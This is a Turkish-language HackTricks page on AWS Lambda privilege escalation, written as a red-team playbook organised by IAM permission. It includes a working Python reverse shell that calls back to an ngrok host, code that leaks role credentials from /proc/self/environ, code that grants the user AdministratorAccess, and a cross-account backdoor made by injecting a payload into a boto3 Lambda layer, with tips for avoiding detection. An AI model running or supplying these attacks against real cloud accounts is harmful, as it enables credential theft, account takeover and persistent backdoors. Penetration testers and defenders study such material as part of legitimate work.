# AWS - Lambda Privilege Escalation

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## lambda

Lambda hakkında daha fazla bilgi:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`, `lambda:CreateFunction` ve `lambda:InvokeFunction`** izinlerine sahip kullanıcılar ayrıcalıklarını yükseltebilir.\
**Varolan bir IAM rolünü yeni bir Lambda işlevine atayarak** yeni bir Lambda işlevi oluşturabilir ve bu işleve o rolle ilişkilendirilen izinleri verebilirler. Kullanıcı daha sonra bu Lambda işlevine kod yazabilir ve yükleyebilir (örneğin bir ters shell).\
İşlev kurulduktan sonra, kullanıcı Lambda işlevini AWS API aracılığıyla çağırarak işlevi tetikleyebilir ve amaçlanan eylemleri gerçekleştirebilir. Bu yaklaşım, kullanıcının IAM rolü ile ilişkilendirilen erişim düzeyi ile işlem yapmasına izin vererek kullanıcının dolaylı olarak görevleri gerçekleştirmesine olanak tanır.\\

Bir saldırgan bunu kullanarak bir **ters shell alıp belirteci çalabilir**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Lambda rol izinlerini **istismar edebilirsiniz**. Eğer lambda rol yeterli izinlere sahipse, bunu kullanarak size yönetici hakları verebilirsiniz:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Ayrıca, dış bir bağlantıya ihtiyaç duymadan lambda'nın rol kimlik bilgilerini sızdırmak mümkündür. Bu, iç görevlerde kullanılan **Ağdan izole edilmiş Lambdalar** için faydalı olacaktır. Ters kabuklarınızı filtreleyen bilinmeyen güvenlik grupları varsa, bu kod parçası lambda'nın çıktısı olarak kimlik bilgilerini doğrudan sızdırmanıza olanak tanır.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potansiyel Etki:** Belirtilen keyfi lambda hizmet rolüne doğrudan ayrıcalık yükseltme.

{% hint style="danger" %}
Dikkat edin ki, **`lambda:InvokeAsync`**'in ilginç görünmesine rağmen, **`aws lambda invoke-async`**'i **yürütmeye izin vermez**, ayrıca `lambda:InvokeFunction`'a da ihtiyacınız vardır.
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Önceki senaryoda olduğu gibi, **`lambda:AddPermission`** izniniz varsa, kendinize **`lambda:InvokeFunction`** iznini **verebilirsiniz**.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potansiyel Etki:** Belirtilen keyfi lambda hizmet rolüne doğrudan ayrıcalık yükseltme.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

**`iam:PassRole`, `lambda:CreateFunction` ve `lambda:CreateEventSourceMapping`** izinlerine sahip kullanıcılar (ve potansiyel olarak `dynamodb:PutItem` ve `dynamodb:CreateTable`) `lambda:InvokeFunction` olmadan bile ayrıcalıkları dolaylı olarak **yükseltebilirler**.\
Kötü niyetli kod içeren bir Lambda işlevi oluşturabilir ve var olan bir IAM rolünü atayabilirler.

Lambda'yı doğrudan çağırmak yerine, kullanıcı bir DynamoDB tablosu kurar veya var olan bir tabloyu kullanır ve bu tabloyu Lambda'ya bir olay kaynağı eşlemesi aracılığıyla bağlar. Bu kurulum, Lambda işlevinin tabloya yeni bir öğe girişi yapıldığında otomatik olarak tetiklendiğinden, kullanıcının eylemi veya başka bir işlem tarafından Lambda işlevinin dolaylı olarak çağrılmasını ve geçilen IAM rolünün izinleriyle kodun yürütülmesini sağlar.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Eğer AWS ortamında DynamoDB zaten etkinse, kullanıcının yalnızca Lambda işlevi için **etkinlik kaynağı eşlemesini kurması gerekir**. Ancak, DynamoDB kullanılmıyorsa, kullanıcının **etkinleştirilmiş akışa sahip yeni bir tablo oluşturması gerekir**:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Şimdi Lambda işlevini DynamoDB tablosuna bağlamak mümkün, bunun için bir olay kaynağı eşlemesi oluşturarak:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Lambda fonksiyonu DynamoDB akışına bağlandığında, saldırgan DynamoDB akışını etkinleştirerek Lambda'yı **dolaylı olarak tetikleyebilir**. Bu, DynamoDB tablosuna bir öğe **ekleyerek** gerçekleştirilebilir:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potansiyel Etki:** Belirtilen lambda hizmet rolüne doğrudan ayrıcalık yükseltme.

### `lambda:AddPermission`

Bu izne sahip bir saldırgan, **kendisine (veya başkalarına) herhangi bir izni verir** (bu, kaynağa erişim izni vermek için kaynak tabanlı politikalar oluşturur):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Potansiyel Etki:** Kodu değiştirme ve çalıştırma iznini vererek lambda hizmet rolüne doğrudan ayrıcalık yükseltme.

### `lambda:AddLayerVersionPermission`

Bu izne sahip bir saldırgan, kendisine (veya başkalarına) `lambda:GetLayerVersion` iznini **vereblir**. Katmana erişebilir ve zafiyetleri veya hassas bilgileri arayabilir

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potansiyel Etki:** Hassas bilgilere erişim olasılığı.

### `lambda:UpdateFunctionCode`

**`lambda:UpdateFunctionCode`** iznine sahip kullanıcılar, **IAM rolüne bağlı olan mevcut bir Lambda işlevinin kodunu değiştirme potansiyeline sahiptir.**\
Saldırgan, **IAM kimlik bilgilerini dışa aktarmak için lambdanın kodunu değiştirebilir**.

Saldırganın işlevi doğrudan çağırma yeteneği olmasa da, Lambda işlevi önceden varsa ve işlevsel durumdaysa, mevcut iş akışları veya olaylar aracılığıyla tetikleneceği olasıdır, bu da değiştirilmiş kodun yürütülmesini dolaylı olarak kolaylaştırır.
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Potansiyel Etki:** Kullanılan lambda hizmet rolüne doğrudan ayrıcalık yükseltme.

### `lambda:UpdateFunctionConfiguration`

#### Tanıtım

[**Lambda Katmanları**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html), **kodunuzu** lambda işlevinize dahil etmenizi sağlar ancak bunu **ayrı bir şekilde depolar**, böylece işlev kodu küçük kalabilir ve **birkaç işlev kodu paylaşabilir**.

Lambda içinde, aşağıdaki gibi bir işlevle python kodunun nereden yüklendiğini kontrol edebilirsiniz:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
İşte yerler:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Örneğin, boto3 kütüphanesi `/var/runtime/boto3` (4. pozisyon) konumundan yüklenir.

#### Sömürü

**Bir katmanı bir işleve eklemek**, yalnızca `lambda:UpdateFunctionConfiguration` iznine ihtiyaç duyar ve **katmanlar hesaplar arasında paylaşılabilir**. Ayrıca **hangi kütüphaneleri kullandıklarını** bilmemiz gerekir, böylece bunları doğru bir şekilde geçersiz kılabiliriz, ancak bu örnekte **saldırılan işlevin boto3'ü içe aktardığını varsayacağız**.

Güvenlik açısından, hedeflediğimiz Lambda çalışma zamanından (Python 3.7) boto3 kütüphanesinin aynı sürümünü yüklemek için Pip'i kullanacağız, böylece hedef işlevde sorunlara neden olabilecek farklı bir şey olmadığından emin olacağız. Bu çalışma zamanı şu anda boto3 sürümü 1.9.42 kullanıyor.

Aşağıdaki kod ile boto3 sürüm 1.9.42 ve bağımlılıklarını yerel bir "lambda\_layer" klasörüne yükleyeceğiz:
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
Sonraki adımda, `/lambda_layer/boto3/__init__.py` dosyasını açacağız ve kötü niyetli kodu ekleyeceğiz. Ekleyeceğimiz payload şu şekilde görünüyor:

![](<../../../.gitbook/assets/image (26).png>)

`requests`, `botocore`dan içe aktarılıyor. Bu işlev, çevre değişkenlerini dışa aktaracak ve try-except ve 0.1 zaman aşımı, bu kodun herhangi bir şeyi bozmadığından emin olmak için bulunmaktadır.

{% hint style="info" %}
**Önemli not:** Gerçek pentestlerde artık `from botocore.vendored import requests` kullanmamalısınız, çünkü bu işlevin CloudWatch günlüklerine bir "DeprecationWarning" yazdırılacak ve bu durum muhtemelen bir savunucu tarafından yakalanmanıza neden olacaktır.
{% endhint %}

Şimdi, bu kodu bir **ZIP dosyasına** paketleyin ve bir **SALDIRGAN hesabındaki yeni bir Lambda katmanına yükleyin**. İlk olarak bir "python" klasörü oluşturmanız ve kütüphanelerinizi oraya koymalısınız, böylece Lambda'ya yüklediğimizde, kod "/opt/python/boto3" konumunda bulunacaktır. Ayrıca, katmanın Python 3.7 ile uyumlu olduğundan ve **katmanın hedef işlevimizle aynı bölgede** olduğundan emin olun. Bu işlem tamamlandığında, `lambda:AddLayerVersionPermission`'ı kullanarak **katmanı genel erişime açık hale getireceğiz**, böylece hedef hesap bunu kullanabilir. Bu API çağrısı için kişisel AWS kimlik bilgilerinizi kullanın.
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Şimdi sahip olduğumuz **kompromize edilmiş kimlik bilgileri** ile hedef Lambda işlevimiz olan "s3-getter" üzerinde aşağıdaki komutu çalıştıracağız, bu da **çapraz hesap Lambda katmanımızı ekleyecek**.
```bash
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Sonraki adım, **fonksiyonu çağırmak** için elimizden geldiğince kendimiz yapmaktır ya da normal yollarla **çağrıldığında beklemektir** - ki bu daha güvenli bir yöntemdir.

Bu zafiyeti **sömürmenin daha gizli bir yolu** şurada bulunabilir:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Potansiyel Etki:** Kullanılan lambda hizmet rolüne doğrudan ayrıcalık yükseltme.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Belki bu izinlerle bir fonksiyon oluşturabilir ve URL'yi çağırarak çalıştırabilirsiniz... ama bunu test etmek için bir yol bulamadım, bu yüzden yapabilirseniz bana bildirin!

### Lambda MitM

Bazı lambdalar **kullanıcılardan parametrelerde hassas bilgiler alacaklar.** Eğer bunlardan birinde RCE alırsanız, diğer kullanıcıların gönderdiği bilgileri dışarıya çıkarabilirsiniz, bunu kontrol edin:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Referanslar

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

<details>

<summary><strong>Sıfırdan kahraman olana kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
